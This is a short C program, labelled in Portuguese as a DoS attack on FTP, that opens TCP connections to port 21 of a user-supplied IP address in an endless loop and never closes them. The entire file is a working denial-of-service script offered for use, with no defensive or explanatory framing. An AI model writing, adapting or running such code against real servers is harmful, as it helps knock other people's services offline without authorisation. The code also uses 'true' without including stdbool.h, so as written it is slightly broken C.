#include <stdio.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h> 
#include <unistd.h> 


int main(int argc, char *argv[]){
    
    int mysocket;
    int conect;
    struct sockaddr_in target;
    if(argc < 2){
        printf("MODO DE USO - ./dos ip_adress\n");
        return 0;
    }
    char *destination;
    destination = argv[1];

    while(true){
        mysocket = socket(AF_INET, SOCK_STREAM, 0);
        target.sin_family = AF_INET;
        target.sin_port = htons(21);
        target.sin_addr.s_addr = inet_addr(destination);

        conect = connect(mysocket, (struct sockaddr *)&target, sizeof(target));

        printf("ATAQUE DOS AO FTP");

    }


    return 0;
}